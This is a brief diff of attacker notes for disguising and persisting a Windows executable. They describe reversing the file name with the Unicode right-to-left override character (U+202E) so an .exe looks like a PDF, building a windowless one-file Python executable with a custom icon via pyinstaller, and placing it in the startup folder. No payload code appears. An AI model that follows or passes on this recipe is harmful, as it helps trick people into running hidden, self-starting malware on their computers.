@@ -1,0 +1,5 @@
+(reverse file name - exe pdf and put in startup)
+(https://unicode-explorer.com/c/202E)
+(U+202E)
+pyinstaller --icon image.ico --onefile -w index.pyw
+Run - shell:startup
